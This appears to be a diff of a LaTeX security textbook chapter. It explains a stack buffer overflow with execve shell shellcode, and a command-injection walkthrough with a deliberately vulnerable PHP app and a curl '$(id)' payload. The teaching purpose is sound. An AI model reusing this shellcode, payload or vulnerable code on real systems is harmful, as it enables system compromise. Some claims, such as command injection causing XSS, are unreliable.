@@ -9,11 +9,10 @@
 \usepackage{xcolor}
 
 \lstset{
-    language=C,
     basicstyle=\ttfamily\small,
     keywordstyle=\color{blue}\ttfamily,
     stringstyle=\color{red}\ttfamily,
-    commentstyle=\color{green}\ttfamily,
+    commentstyle=\color{gray}\ttfamily,
     morecomment=[l][\color{magenta}]{\#},
     breaklines=true
 }
@@ -202,7 +201,6 @@ computation} to the function `example`~\ref{code:example_func} is shown in~\ref{
   }
 \end{lstlisting}%
 \label{code:example_func}
-
 
 We can see that the stack frame contains some interesting `variables' that we
 haven't defined ourselves:
@@ -504,6 +502,7 @@ seeking to exploit vulnerabilities and defenders striving to secure systems, a
 dynamic that continues to define the software security landscape today.
 
 \subsection{Early stage}
+\subsubsection{Shellcoding}
 \begin{comment}
   shellcoding
   reference smashing the stack for fun and profit
@@ -523,7 +522,6 @@ code gives the attacker full control over the compromised system, thereby
 illustrating the severity and implications of buffer overflow vulnerabilities.
 
 Below \ref{lst:bof} is an example of a vulnerable program.
-
 
 \begin{minipage}{\linewidth}
 \begin{lstlisting}[caption={Buffer overflow shellcoding example}
@@ -624,7 +622,35 @@ Makefile  say_hi  shellcode_malicious_input.bin
 Our simple program seems to be behaving like a system shell. We will now analyse
 what happened during the execution of our program. Here~\ref{lst:bof_malicous_hex}
 is a hexdump of the input. Let's break it down:
+\begin{enumerate}
+  \item The first 0x100 bytes of the payload are just null bytes\footnote{We are
+  allowed to do this because \emph{gets} does not stop reading the string when it
+  encounters a \emph{NULL} (0) byte, even though strings in C are almost always
+  NULL terminated.~\emph{scanf} will only return when it encounters an error or
+  reads a line ending}. We do this in order to fill up the buffer that the
+  application uses. These values could realistically be anything (besides line
+  endings).
+  \item As shown in\ref{veziacistackuala} we now need to overflow the
+  \emph{base pointer}. In this exploitation scenario this can also be any value,
+  but it can allow us to pivot the stack into some memory address we know in some cases.
+  \item Now we overwrite the \emph{return address} to point to the address of the \emph{jump rsp} instruction.
+  \item After the return address we place a \emph{nop sled}. The purpose of the nop
+  sled is to allow us some leeway\footnote{When jumping into shellcode written to the stack the addresses the stack register and instruction pointer point to are close together. Stack manipulations (such as \emph{push}es and \emph{pop}s) can overwrite the shellcode, causing it to misbehave or making the processor execute illegal instructions.} when crafting the actual malicious payload.
+  \item Finally we place the instructions we want to execute. The payload exemplified\ref{vezipayload} here uses the \emph{execve} syscall to replace the current running
+  process with the \emph{sh} shell process.
+\end{enumerate}
 
+This traditional exploitation technique of buffer overflow into shellcode has
+been effectively mitigated by a plethora of defensive mechanisms that we will
+discuss in subsequent chapters, such as Address Space Layout Randomization
+(ASLR), Data Execution Prevention (DEP), Stack Canaries, and Control-Flow
+Integrity (CFI). Despite these advancements, the described exploitation
+scenarios retain relevance in contexts where these protection measures are
+absent or cannot be implemented. For example, systems lacking a Memory
+Management Unit (MMU), many embedded systems, and certain router configurations
+may not have these defenses, leaving them susceptible to such attacks. Thus,
+understanding these exploits remains critical in a comprehensive approach to
+system security.
 
 \begin{figure}[ht]%
   \centering
@@ -682,6 +708,83 @@ is a hexdump of the input. Let's break it down:
   \label{fig:stackframe}
 \end{figure}
 
+\begin{lstlisting}[caption={Shellcode disassembly}
+      ,label={lst:bof}
+      ,language={[x86masm]Assembler}]
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push b'/bin///sh\x00' */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array ['sh\x00'] */
+    /* push b'sh\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* 'sh\x00' */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+    syscall
+\end{lstlisting}
+
+\subsubsection{Command injection}
+Command injection vulnerabilities represent a pervasive class of security issues
+that impact both web and system programming environments. These vulnerabilities
+occur when an application passes unsafe user-supplied data (forms, cookies, HTTP
+headers, etc.) to a system shell, allowing the attacker to execute arbitrary
+commands on the host operating system. In the context of web applications, these
+flaws are primarily found in scripts that fail to properly sanitize user input,
+making them susceptible to cross-site scripting (XSS) and SQL injection attacks.
+However, command injection vulnerabilities are not confined to web programming;
+they are equally prevalent in systems programming. Poorly designed system
+applications and scripts that accept untrusted input for command execution can
+expose the system to similar attacks. This vulnerability, thus, underlines the
+importance of careful data handling and proper input validation, irrespective of
+the programming environment.
+
+We will be walking through the following\ref{veziphpbapula} vulnerable PHP app.
+The application lacks proper input validation and allows an attacker to execute
+arbitrary commands. The use of the \emph{system} function will cause the following
+process to execute \texttt{sh -c ``echo Hello <username>''}. Our\ref{poggeroni}
+malicious request sets the \emph{username} parameter to \verb|$(id)|. Because
+the original command executes in a shell environment, the shell will interpret
+this string by forking itself and executing the string in between the braces and
+replacing the original string with the result of the command. We can imagine that
+we can cause havoc on the vulnerable machine by being able to execute any command
+we want.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Command Injection example}
+      ,label={lst:bof}
+      ,language=PHP]
+<?php
+    $username = $_GET['username'];
+    system("echo Hello " . $username);
+?>
+\end{lstlisting}
+\end{minipage}
+
+\begin{lstlisting}[caption={Command Injection example}
+      ,label={lst:bof}
+      ,language=bash]
+$ docker run -d -p 8080:80 command_injection_php
+d58498277e1194cc46dac4009f8fca1c84ce02bea21008075ad53f77bd63202f
+$ curl http://127.0.0.1:8080/hello\?username\=$\(id\)
+Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
+\end{lstlisting}
+
+Command injection vulnerabilities can drastically undermine security measures. They enable attackers to bypass reverse proxies, offering unauthorized access to protected internal services. Moreover, such vulnerabilities can assist in creating botnets by allowing threat actors to inject commands to download and install malicious software, leading to potential large-scale cyber threats such as Distributed Denial of Service (DDoS) attacks.
+
+The situation is similar in the systems programming space. The example for how 
+a vulnerable program might look is left as an exercise to the reader.
 \subsection{Evolution}
 \begin{comment}
   ret2libc
